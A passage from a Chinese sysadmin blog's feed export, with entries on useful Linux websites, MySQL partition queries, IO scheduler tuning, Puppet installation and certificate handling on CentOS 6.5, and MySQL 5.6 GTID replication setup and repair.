<p>  简单说就是个性化生成命令提示符，可将生成的代码写入到用户家目录的.bashrc或者可以设置全局变量文件/etc/profile对所有用户生效<br>可参考：<a href="http://stackoverflow.com/questions/4133904/ps1-line-with-git-current-branch-and-colors" target="_blank" rel="external">http://stackoverflow.com/questions/4133904/ps1-line-with-git-current-branch-and-colors</a></p>
<p><strong>3. <a href="http://vim-adventures.com/" target="_blank" rel="external">Vim-adventures.com</a> 通过RPG游戏练习VIM使用</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/vim.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/vim.jpg" alt="vim"></a></p>
<p>  通过RPG游戏练习VIM编辑器的使用，使用h,j,k,l字符移动人物来获得新的命令能力和搜集钥匙，查看帮助可使用:help;赶脚这个非常cool!</p>
<p><strong>4. <a href="https://try.github.io/levels/1/challenges/2" target="_blank" rel="external">Try Github</a> 在线学习Git版本控制</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/trygit.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/trygit.jpg" alt="trygit"></a></p>
<p>  十五分钟学会Git，很明显这个网站模拟了一个控制台，以很时尚的界面让人对Git不再望而生畏</p>
<p><strong>5. <a href="http://shortcutfoo.com/" target="_blank" rel="external">Shortcutfoo.com</a></strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/shortcutfoo.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/shortcutfoo.jpg" alt="shortcutfoo"></a></p>
<p>  是一个练习快捷键的好地方，涵盖了vim、sublime、emacs、git等软件的快捷使用方式和友好的说明</p>
<p><strong>6. <a href="https://github.com/geekwolf/free-programming-books" target="_blank" rel="external">GitHub Free Programming Books</a> 免费编程书籍</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/freebooks.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/freebooks.jpg" alt="freebooks"></a></p>
<p>  以Github管理的方式搜集了免费的编程和系统管理等书籍，给作者点1024个赞~~，另外连接是fork原作者，后续增加中文书籍</p>
<p><strong>7. <a href="http://collabedit.com/" target="_blank" rel="external">Collabedit.com</a> 实时文本交互聊天</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/coolabedit.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/coolabedit.jpg" alt="coolabedit"></a></p>
<p>   先说下使用，你可以创建一个文档<code>http://collabedit.com/yb22u</code>填写相关的用户名和选择语言；然后可以将此文档地址发给另一个人，那么互相之间就可以实时看到对方的输入，有高亮语法；使用场合嘛，比如通过collabedit可以考量对方编程能力等</p>
<p><strong>8. <a href="http://cpp.sh/" target="_blank" rel="external">Cpp.sh</a> 在线编写运行分享C++代码编辑器</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/cpp.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/cpp.jpg" alt="cpp"></a></p>
<p>  可在线编辑运行C++代码，亦可Ctrl+Z生成url分享给好友</p>
<p><strong>9. <a href="http://copy.sh/v24/" target="_blank" rel="external">Copy.sh</a> 浏览器运行虚拟机</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/copy.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/copy.jpg" alt="copy"></a></p>
<p>  又一个非常crazy的工具，在线运行虚拟机，可以选择下载虚拟机镜像也可以上传自己的iso，copy.sh在线运行虚拟机源码：<a href="https://github.com/copy/v86" target="_blank" rel="external">https://github.com/copy/v86</a>；</p>
<p><strong>10. <a href="http://commandlinefu.com/" target="_blank" rel="external">Commandlinefu.com</a> 命令或记录网站</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/commandlinefu.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/commandlinefu.jpg" alt="commandlinefu"></a></p>
<p>  做运维的应该都知道这个网站，可以分享自己的CLI库，也可以学习借鉴别人的命令脚本</p>
<p><strong>11. <a href="http://alias.sh/" target="_blank" rel="external">Alias.sh</a> 命令别名数据库</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/alias.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/alias.jpg" alt="alias"></a></p>
<p>  有点类似commandlinefu了，可以通过这个网站借鉴获取和分享有用的命令别名<br>比如lr别名定义了显示目录树</p>
<pre><code>alias lr=&apos;ls -R | grep &quot;:$&quot; | sed -e &apos;\&apos;&apos;s/:$//&apos;\&apos;&apos; -e &apos;\&apos;&apos;s/[^-][^\/]*\//--/g&apos;\&apos;&apos; -e &apos;\&apos;&apos;s/^/   /&apos;\&apos;&apos; -e &apos;\&apos;&apos;s/-/|/&apos;\&apos;&apos;&apos;
</code></pre><p><strong>12. <a href="http://distrowatch.com/" target="_blank" rel="external">Distrowatch.com</a> 提供了Linux发行版的详细信息</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/distrowatch.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/distrowatch.jpg" alt="distrowatch"></a></p>
<p>  通过Distrowath不仅可以精确的查看互联网都有哪些流行的Linux发行版，还可以查看每个发行版的相关信息如默认桌面环境、默认应用程序及镜像的下载链接；堪称Linux的数据库</p>
<p><strong>13. <a href="http://linuxmanpages.com/" target="_blank" rel="external">Linuxmanpages.com</a> 在线查看命令帮助</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/manpages.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/manpages.jpg" alt="manpages"></a></p>
<p>  相当于系统内部的man、help、info等的综合吧</p>
<p><strong>14. <a href="http://awesomecow.com/" target="_blank" rel="external">AwesomeCow.com</a> 适用Linux环境的软件搜索引擎</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/awe.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/awe.jpg" alt="awe"></a></p>
<p>  如果有款win下好用的软件想在linux下使用，或许可以通过AwesomeCow找到与其类似或者一样的软件，或者通过WINE</p>
<p><strong>15. <a href="http://penguspy.com/" target="_blank" rel="external">PenguSpy.com</a> Linux好玩游戏合集</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/pengu.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/pengu.jpg" alt="pengu"></a></p>
<p><strong>16. <a href="http://lxr.free-electrons.com/" target="_blank" rel="external">Linux Cross Reference by Free Electrons</a> 在线查看内核代码及不同版本的差异</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/cross.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/cross.jpg" alt="cross"></a></p>
<p>对于内核开发者或许有很大的帮助</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[查看分区信息]]></title>
      <url>/2014/08/20/e6-9f-a5-e7-9c-8b-e5-88-86-e5-8c-ba-e4-bf-a1-e6-81-af.html</url>
      <content type="html"><![CDATA[<p>查看Mysql里都有哪些数据库里面有什么分区表</p>
<pre><code>SELECT 
TABLE_SCHEMA, TABLE_NAME, PARTITION_NAME, PARTITION_COMMENT
FROM
INFORMATION_SCHEMA.PARTITIONS
WHERE
PARTITION_NAME IS NOT NULL;
`&lt;/pre&gt;

查看某个分区表都有哪些分区及使用情况

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`USE LOCKLOG;
SELECT 
partition_name part,
partition_expression expr,
partition_description descr,
table_rows
FROM
INFORMATION_SCHEMA.partitions
WHERE
TABLE_SCHEMA = schema()
AND TABLE_NAME = &apos;lock_log&apos;;
`&lt;/pre&gt;

查看分区表lock_log的创建sql及分区类型

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;` SHOW CREATE TABLE lock_log \G;
</code></pre><p>其他分区操作和管理请参考：<br><a href="http://www.simlinux.com/archives/133.html">http://www.simlinux.com/archives/133.html</a></p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 分区 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IO调度算法适用场景]]></title>
      <url>/2014/08/20/io-e8-b0-83-e5-ba-a6-e7-ae-97-e6-b3-95-e9-80-82-e7-94-a8-e5-9c-ba-e6-99-af.html</url>
      <content type="html"><![CDATA[<pre><code>通常磁盘的读写影响是由磁头到柱面移动造成了延迟，解决这种延迟内核主要采用两种策略：缓存和IO调度算法来进行弥补
</code></pre><p><strong>Caching：</strong>IO请求被缓存在大页和buffer caches里面，读请求会预先从缓存读取，写请求会先写进缓存，然后在保存到磁盘<br><strong>四种IO调度算法：</strong></p>
<pre><code>cat /sys/block/sda/queue/scheduler
noop anticipatory deadline [cfq] (当前是cfq)
`&lt;/pre&gt;

[![io](http://www.simlinux.com/wp-content/uploads/2014/08/io1.png)](http://www.simlinux.com/wp-content/uploads/2014/08/io1.png)

**noop：**noop调度算法不会对I/O请求排序操作，除了合并外也不会做任何其他优化，直接以类似FIFO的顺序提交I/O请求；对于SSD、虚拟机或者存储设备可能会更加高效
**anticipatory(as)：**基于预测的IO算法，类似DeadLine，也维护了三个请求对列；区别在于当它处理完一个I/O请求后并不会直接返回处理下一个请求，而是等待6ms(默认),如果这时候有新来的针对当前扇区相邻扇区的请求，那么会直接处理它，当等待时间结束后，调度器才返回处理下一个对列请求
试想一下，如果系统有频繁的针对邻近扇区的I/O请求，那么这种预测算法必然大幅提高整体的吞吐量，毕竟节约了那么多寻道时间
**deadline：**DEADLINE 在CFQ的基础上，解决了IO请求饿死的极端情况。除了CFQ本身具有的IO排序队列之外，DEADLINE额外分别为读IO和写IO提供了FIFO队 列。读FIFO队列的最大等待时间为500ms，写FIFO队列的最大等待时间为5s。FIFO队列内的IO请求优先级要比CFQ队列中的高，，而读 FIFO队列的优先级又比写FIFO队列的优先级高。优先级可以表示如下：
FIFO(Read) &amp;gt; FIFO(Write) &amp;gt; CFQ
deadline 算法保证对于既定的 IO 请求以最小的延迟时间，从这一点理解，对于 DSS 应用应该会是很适合的
**cfq(2.6.18+内核默认CFQ)：**该算法的特点是按照IO请求的地址进行排序，而不是按照先来后到的顺序来进行响应。在传统的SAS盘上，磁盘寻道花去了绝大多数的IO响应时间。CFQ的出发点是对IO地址进行排序，以尽量少的磁盘旋转次数来满足尽可能多的IO请求。在 CFQ算法下，SAS盘的吞吐量大大提高了。但是相比于NOOP的缺点是，先来的IO请求并不一定能被满足，可能会出现饿死的情况；

**调度算法适用场合：**
在传统的SAS盘上，CFQ、DEADLINE、ANTICIPATORY都是不错的选择；对于专属的数据库服务器和文件服务器，DEADLINE的吞吐量和响应时间都表现良好，适用于大量IO操作的环境

在SSD、Fusion IO上，最简单的NOOP反而可能是最好的算法，因为其他三个算法的优化是基于缩短寻道时间的，而固态硬盘没有所谓的寻道时间且IO响应时间非常短。
ANTICIPATORY通常更适用于大量持续读的环境，并不适用于DB Server
CFQ 适用于有大量来自不同进程的并发读写的环境如桌面环境等

**手动临时更改调度算法：**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`echo deadline &amp;gt; /sys/block/sda/queue/scheduler
`&lt;/pre&gt;

**永久更改：**
**A.使用tuned来修改调度算法**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`比如：vim /etc/tuned-profiles/throughtput-performance/ktune.sysconfig
ELEVATOR=&quot;deadline&quot;
ELEVATOR_TUNE_DEVS=&quot;/sys/block/{sd,cciss,dm-,vd}*/queue/scheduler&quot;
tuned-admin profile throughtput-performance
chkconfig tuned on
chkconfig ktune on
更改调度算法之后/sys/block/sda/quue/iosched/会生成对应的参数文件
`&lt;/pre&gt;

**B.通过修改grub.conf来修改调度算法**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;` kernel /vmlinuz-2.6.32-358.11.1.el6.x86_64 ro root=UUID=97693d73-443f-438a-90a3-208855faff19 rd_NO_LUKS  KEYBOARDTYPE=pc KEYTABLE=us rd_NO_MD crashkernel=auto LANG=zh_CN.UTF-8 rd_NO_LVM rd_NO_DM elevator=deadline rhgb quiet
`&lt;/pre&gt;

**查看调度算法参数的含义：**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`yum -y install kernel-doc
比如:/usr/share/doc/kernel-doc-2.6.32/Documentation/block/deadline-iosched.txt
</code></pre>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> IO调度 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Centos6.5下安装Puppet及测试]]></title>
      <url>/2014/08/20/centos6-5-e4-b8-8b-e5-ae-89-e8-a3-85puppet-e5-8f-8a-e6-b5-8b-e8-af-95.html</url>
      <content type="html"><![CDATA[<h5 id="安装前注意事项"><a href="#安装前注意事项" class="headerlink" title="安装前注意事项"></a><strong><span id="ap1" style="font-weight: inherit; font-style: inherit;">安装前注意事项</span></strong></h5><ol>
<li>Puppet master尽量使用高配置server</li>
<li>任何官方未支持的系统也可以正常运行puppet，前提是要装合适的版本的ruby环境<br>请参考:<a href="http://docs.puppetlabs.com/puppet/latest/reference/system_requirements.html#basic-requirements" target="_blank" rel="external">http://docs.puppetlabs.com/puppet/latest/reference/system_requirements.html#basic-requirements</a></li>
<li>master防火墙放行8140端口给agent</li>
<li>每个节点都必须有一个唯一的主机名，正解析和反解析都被正确配置，如果没有DNS服务，必须在每个节点上配置/etc/hosts<br><strong>注</strong>：默认情况下puppet的master的主机名是puppet</li>
<li>由于Puppet master同时扮演着CA(认证授权机构)的角色,需要时间同步,启动ntpd服务；</li>
<li>两种工作模式：Master/Agent、Standatone</li>
</ol>
<h5 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a><strong><span id="ap2" style="font-weight: inherit; font-style: inherit;">环境说明</span></strong></h5><p>192.168.10.216   Puppet Agent   c1.geekwolf.github.io<br>192.168.10.217   Puppet Agent   c2.geekwolf.github.io<br>192.168.10.218   Puppet Master   m.geekwolf.github.io</p>
<h5 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a><strong><span id="ap3" style="font-weight: inherit; font-style: inherit;">安装步骤</span></strong></h5><h6 id="安装puppet"><a href="#安装puppet" class="headerlink" title="安装puppet"></a><strong><span id="ap4" style="font-weight: inherit; font-style: inherit;">安装puppet</span></strong></h6><p>rpm -ivh <a href="http://yum.puppetlabs.com/puppetlabs-release-el-6.noarch.rpm" target="_blank" rel="external">http://yum.puppetlabs.com/puppetlabs-release-el-6.noarch.rpm</a><br>说明:若要测试RC版及相关软件编辑/etc/yum.repos.d/puppetlabs.repo：</p>
<pre><code>[puppetlabs-devel]
name=Puppet Labs Devel El 6 - $basearch
baseurl=http://yum.puppetlabs.com/el/6/devel/$basearch
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-puppetlabs
enabled=1
gpgcheck=1

yum -y install  ntp
service ntpd start
chkconfig ntpd on
`&lt;/pre&gt;

配置好hostname，并将解析写进hosts同步到所有节点
**&lt;span id=&quot;ap5&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;在master:192.168.10.218安装puppet-server&lt;/span&gt;**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`yum -y install puppet-server（依赖puppet、facter一起安装）
生成启动脚本:
/etc/init.d/puppetmaster 
Master配置文件目录：
/etc/puppet

chkconfig puppetmaster on
service puppetmaster start

升级puppet master：
puppet resource package puppet ensure=latest
service puppetmaster restart
`&lt;/pre&gt;

**在c1 c2 上安装puppet**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`yum -y install puppet
chkconfig puppet on
service puppet start
Agent配置文件目录:
/etc/sysconfig/puppet.conf
`&lt;/pre&gt;

**&lt;span id=&quot;ap6&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;配置puppet agent c1 c2指定Puppet Master地址&lt;/span&gt;**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`vim  /etc/puppet/puppet.conf
[main]
# The Puppet log directory.
# The default value is &apos;$vardir/log&apos;.
logdir = /var/log/puppet
# Where Puppet PID files are kept.
# The default value is &apos;$vardir/run&apos;.
rundir = /var/run/puppet
# Where SSL certificates are kept.
# The default value is &apos;$confdir/ssl&apos;.
ssldir = $vardir/ssl
[agent]
# The file in which puppetd stores a list of the classes
# associated with the retrieved configuratiion. Can be loaded in
# the separate ``puppet`` executable using the ``--loadclasses``
# option.
# The default value is &apos;$confdir/classes.txt&apos;.
classfile = $vardir/classes.txt
# Where puppetd caches the local configuration. An
# extension indicating the cache format is added automatically.
# The default value is &apos;$confdir/localconfig&apos;.
localconfig = $vardir/localconfig
server = m.geekwolf.github.io
`&lt;/pre&gt;

###### **&lt;span id=&quot;ap7&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;证书管理&lt;/span&gt;**

**A.手动签发证书**
c1、c2申请证书，由于已经配置了server=m.geekwolf.github.io，故申请时不必在指定server

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`[root@c1 ~]# puppet agent -t
Info: Creating a new SSL key for c1.geekwolf.github.io
Info: Caching certificate for ca
Info: Caching certificate_request for c1.geekwolf.github.io
Info: Caching certificate for ca
Exiting; no certificate found and waitforcert is disabled
`&lt;/pre&gt;

在Master上管理证书：
**签发证书：**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`puppet cert list --all                   查看请求签发的证书（+表示已签发，-未签发）
puppet cert --sign c1.geekwolf.github.io 签发主机c1.geekwolf.github.io的证书
puppet cert --sign --all                 签发所有请求的主机的证书
`&lt;/pre&gt;

**注销证书：**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`puppet cert revoke  c1.geekwolf.github.io 注销主机c1.geekwolf.github.io的证书
puppet cert revoke --all                  注销所有主机的证书（若想在重新签名，需先重启puppetmaster,然后节点在请求申请证书，再签名即可）
`&lt;/pre&gt;

**清除证书：**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`在master上清除某节点证书,重启puppetmaster后生效
puppet cert --clean c1.geekwolf.github.io 

在agent上删除相关目录,可以重新再申请签名   
rm -rf /var/lib/puppet/ssl 或者rm -rf /var/lib/puppet/certs/c1.geekwolf.github.io.pem 
`&lt;/pre&gt;

**B.自动签发证书**
在Puppet Master创建/etc/puppet/autosign.conf文件
*.geekwolf.github.io (geekwolf.github.io域的申请会自动签发)
service puppetmaster restart
所有节点上执行
rm -rf /var/lib/puppet/ssl

然后所有的节点申请签名
puppet agent -t —server m.geekwolf.github.io

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`在Puppet Master查看签名
[root@m puppet]# puppet cert list --all
+ &quot;c1.geekwolf.github.io&quot; (SHA256) 2A:28:96:6C:B0:36:E8:CC:71:80:F4:C6:B5:D8:61:94:A8:59:46:9D:52:A3:58:2A:D9:78:45:A3:57:93:1C:38
+ &quot;c2.geekwolf.github.io&quot; (SHA256) 09:59:71:9A:CA:AE:92:82:1D:D4:0C:A6:D4:5F:51:C3:D6:E4:EE:80:20:19:CB:B1:71:EE:B3:24:F7:E3:80:71
+ &quot;m.geekwolf.github.io&quot; (SHA256) 10:F3:28:EA:36:25:38:C5:1C:8A:38:FD:94:EF:F9:77:6B:97:E9:FA:60:18:D5:53:DD:5D:DA:15:88:4F:96:A1 (alt names: &quot;DNS:m.geekwolf.github.io&quot;, &quot;DNS:puppet&quot;, &quot;DNS:puppet.geekwolf.github.io&quot;)
`&lt;/pre&gt;

**参考文档：** [多CA配置](http://docs.puppetlabs.com/puppet/3.6/reference/config_ssl_external_ca.html#option-3-two-intermediate-cas-issued-by-one-root-ca)

###### **&lt;span id=&quot;ap8&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;测试&lt;/span&gt;**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`默认agent（c1，c2）每30分钟连接到puppet master,为测试方便先修改连接时间
echo &quot;runinterval = 10&quot; &amp;gt;&amp;gt;/etc/puppet/puppet.conf
service puppet restart

Puppet Master：
vim /etc/puppet/manifests/site.pp
file {&quot;/tmp/test.txt&quot; :
  content=&amp;gt;&quot;test from geekwolf!~\n&quot;; } 

检查c1 c2是否有/tmp/test.txt文件
</code></pre>]]></content>
      
        <categories>
            
            <category> 自动化运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> puppet </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL5.6基于GTID复制配置]]></title>
      <url>/2014/08/20/mysql5-6-e5-9f-ba-e4-ba-8egtid-e5-a4-8d-e5-88-b6-e9-85-8d-e7-bd-ae.html</url>
      <content type="html"><![CDATA[<h5 id="一、什么是GTID？"><a href="#一、什么是GTID？" class="headerlink" title="一、什么是GTID？"></a><strong><span id="gg1" style="font-weight: inherit; font-style: inherit;">一、什么是GTID？</span></strong></h5><p>  GTID(Global Transaction Identifiers)是全局事务标识<br>当使用GTIDS时，在主上提交的每一个事务都会被识别和跟踪，并且运用到所有从MySQL，而且配置主从或者主从切换时不再需要指定 master_log_files和master_log_pos；由于GTID-base复制是完全基于事务的，所以能很简单的决定主从复制的一致性；官方建议Binlog采用Row格式</p>
<h5 id="二、GTID的表示方式"><a href="#二、GTID的表示方式" class="headerlink" title="二、GTID的表示方式"></a><strong><span id="gg2" style="font-weight: inherit; font-style: inherit;">二、GTID的表示方式</span></strong></h5><p>source_id：transaction_id<br>source_id：表示执行事务的主库的UUID(server_uuid:Mysql5.6的data目录下启动时会生成auto.cnf文件记录了uuid，重启后uuid不变，删除文件后会重新生成新的uuid)；<br>transaction_id：是一个从1开始自增的计数，表示在这个主库上执行的第n个事务；<br>由于每台Mysql的uuid是全球唯一的，transaction_id自身唯一，就保证了GTID全局唯一性</p>
<pre><code>mysql&amp;gt; show variables like &apos;server_uuid&apos;; 
+---------------+--------------------------------------+
| Variable_name | Value |
+---------------+--------------------------------------+
| server_uuid | 4468c0e8-ef6f-11e3-9c2c-0200c0a80ad8 |
+---------------+--------------------------------------+
1 row in set (0.00 sec)
`&lt;/pre&gt;

##### **&lt;span id=&quot;gg3&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;三、基于GTID的复制配置&lt;/span&gt;**

**master：**192.168.10.216
**slave ：**192.168.10.217
**步骤：**
修改主从my.cnf增加GTID支持—&amp;gt;主只读—&amp;gt;拷贝数据到从数据目录—&amp;gt;重启主从—&amp;gt;在从上进行配置
1.修改主从my.cnf增加GTID支持

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`主Mysql配置：
server-id=216   
binlog-format=ROW
gtid-mode=on
enforce-gtid-consistency=true 
log-bin=mysql-bin
log-slave-updates=true   slave更新是否记入日志

从Mysql配置：
server-id=217   同一个复制拓扑中的所有服务器的id号必须惟一
binlog-format=ROW
gtid-mode=on  启用gtid类型，否则就是普通的复制架构
enforce-gtid-consistency=true 强制GTID的一致性
log-bin=mysql-bin
log-slave-updates=true   slave更新是否记入日志
只从库配置：
slave-paralles-workers 设定从服务器的SQL线程数；0表示关闭多线程复制功能；
`&lt;/pre&gt;

2.主只读

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; SET @@global.read_only = ON;
`&lt;/pre&gt;

拷贝主数据到从目录

3.重启主从Mysql

4.在从上配置基于GTID的复制

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; CHANGE MASTER TO 
     &amp;gt; MASTER_HOST = ‘192.168.10.216’,
     &amp;gt; MASTER_PORT = 3306,
     &amp;gt; MASTER_USER = &apos;rep&apos;,
     &amp;gt; MASTER_PASSWORD = &apos;geekwolf&apos;,
     &amp;gt; MASTER_AUTO_POSITION = 1;
`&lt;/pre&gt;

5.启动从库

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; start slave; 
Query OK, 0 rows affected, 1 warning (0.00 sec)

mysql&amp;gt; show slave status \G
*************************** 1\. row ***************************
   Slave_IO_State: Waiting for master to send event
  Master_Host: 192.168.10.216
  Master_User: rep
  Master_Port: 3306
Connect_Retry: 60
  Master_Log_File: mysql-bin.000002
  Read_Master_Log_Pos: 41921904
   Relay_Log_File: relay-bin.000002
Relay_Log_Pos: 64520
Relay_Master_Log_File: mysql-bin.000002
 Slave_IO_Running: Yes
Slave_SQL_Running: Yes
  Replicate_Do_DB:
  Replicate_Ignore_DB:
   Replicate_Do_Table:
   Replicate_Ignore_Table:
  Replicate_Wild_Do_Table:
  Replicate_Wild_Ignore_Table: mysql.%
   Last_Errno: 0
   Last_Error:
 Skip_Counter: 0
  Exec_Master_Log_Pos: 41921904
  Relay_Log_Space: 64718
  Until_Condition: None
   Until_Log_File:
Until_Log_Pos: 0
   Master_SSL_Allowed: No
   Master_SSL_CA_File:
   Master_SSL_CA_Path:
  Master_SSL_Cert:
Master_SSL_Cipher:
   Master_SSL_Key:
Seconds_Behind_Master: 0
Master_SSL_Verify_Server_Cert: No
Last_IO_Errno: 0
Last_IO_Error:
   Last_SQL_Errno: 0
   Last_SQL_Error:
  Replicate_Ignore_Server_Ids:
 Master_Server_Id: 216
  Master_UUID: 21ad8db5-f038-11e3-a14a-0200c0a80ad8
 Master_Info_File: /usr/local/mysql/data/master.info
SQL_Delay: 0
  SQL_Remaining_Delay: NULL
  Slave_SQL_Running_State: Reading event from the relay log
   Master_Retry_Count: 86400
  Master_Bind:
  Last_IO_Error_Timestamp:
 Last_SQL_Error_Timestamp:
   Master_SSL_Crl:
   Master_SSL_Crlpath:
   Retrieved_Gtid_Set: 21ad8db5-f038-11e3-a14a-0200c0a80ad8:76793-77026
Executed_Gtid_Set: 21ad8db5-f038-11e3-a14a-0200c0a80ad8:1-77025
Auto_Position: 1
1 row in set (0.00 sec)
`&lt;/pre&gt;

**注：**

两个Yes代表复制正常
Slave_IO_Running: Yes
Slave_SQL_Running: Yes

基于GTID复制的新特性：
Retrieved_Gtid_Set: 21ad8db5-f038-11e3-a14a-0200c0a80ad8:76793-77026
Executed_Gtid_Set: 21ad8db5-f038-11e3-a14a-0200c0a80ad8:1-77025

Retrieved_Gtid_Set项：记录了relay日志从Master获取了binlog日志的位置
Executed_Gtid_Set项：记录本机执行的binlog日志位置（如果是从机，包括Master的binlog日志位置和slave本身的binlog日志位置）

##### **&lt;span id=&quot;gg4&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;四、基于GTID复制增加新的slave&lt;/span&gt;**

  备份主MySQL数据，记录主gtid_executed—&amp;gt;将备份数据恢复到从数据目录—&amp;gt;设置从gtid_purged的值为主的gtid_executed值—&amp;gt;启动复制即可

1.使用mysqldump备份主数据
mysqldump —all-databases —single-transaction —triggers —routines —host=127.0.0.1 —port=3306 —user=root —password=geekwolf &amp;gt; backup.sql
亦可以使用xtrabackup也支持GTID：
请参考:[http://www.mysqlperformanceblog.com/2013/05/09/how-to-create-a-new-or-repair-a-broken-gtid-based-slave-with-percona-xtrabackup/](http://www.mysqlperformanceblog.com/2013/05/09/how-to-create-a-new-or-repair-a-broken-gtid-based-slave-with-percona-xtrabackup/)

2.传到从MySQL，恢复数据
由于新版本msqldump会记录并设置GTID_PURGED的值等于主的GTID_EXECUTED，所以只需要将sql导入到从库即可

3.启动主从复制

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`从库执行
mysql &amp;gt; CHANGE MASTER TO MASTER_HOST=&apos;127.0.0.1&apos;, MASTER_USER=&apos;root&apos;, MASTER_PASSWORD=geekwolf&apos;, MASTER_PORT=3306, MASTER_AUTO_POSITION = 1;
mysql &amp;gt; START SLAVE;
`&lt;/pre&gt;

##### **&lt;span id=&quot;gg5&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;五、基于GTID复制出错的解决办法&lt;/span&gt;**

**问题:**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`Slave_IO_Running: No
Slave_SQL_Running: Yes
Last_IO_Error: Got fatal error 1236 from master when reading data from binary log: &apos;The slave is connecting using CHANGE MASTER TO MASTER_AUTO_POSITION = 1, but the master has purged binary logs containing GTIDs that the slave requires.&apos;
`&lt;/pre&gt;

**解决思路:**

从复制跳过已经丢失的binlog，继续复制或者重新做主从（可以参考上面的操作）

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`主MySQL：
mysql&amp;gt; show global variables like &apos;%gtid_executed%&apos;;
+---------------+-----------------------------------------------+
| Variable_name | Value |
+---------------+-----------------------------------------------+
| gtid_executed | 21ad8db5-f038-11e3-a14a-0200c0a80ad8:1-223937 |
+---------------+-----------------------------------------------+
1 row in set (0.00 sec)

从MySQL：
mysql&amp;gt; set global GTID_PURGED=&quot;21ad8db5-f038-11e3-a14a-0200c0a80ad8:1-223937&quot;;
ERROR 1840 (HY000): @@GLOBAL.GTID_PURGED can only be set when @@GLOBAL.GTID_EXECUTED is empty.

mysql&amp;gt; reset master;
Query OK, 0 rows affected (0.19 sec)
mysql&amp;gt; show global variables like &apos;GTID_EXECUTED&apos;;
+---------------+-----------------------------------------------+
| Variable_name | Value |
+---------------+-----------------------------------------------+
| gtid_executed |  |
+---------------+-----------------------------------------------+
1 row in set (0.00 sec)

mysql&amp;gt; stop slave;
Query OK, 0 rows affected, 1 warning (0.00 sec)

mysql&amp;gt; set global GTID_PURGED=&quot;21ad8db5-f038-11e3-a14a-0200c0a80ad8:1-223937&quot;;
Query OK, 0 rows affected (0.13 sec)

mysql&amp;gt; start slave;
Query OK, 0 rows affected (0.04 sec)

mysql&amp;gt; show slave status\G
[...]
Slave_IO_Running: Yes
Slave_SQL_Running: Yes
[...]
`&lt;/pre&gt;

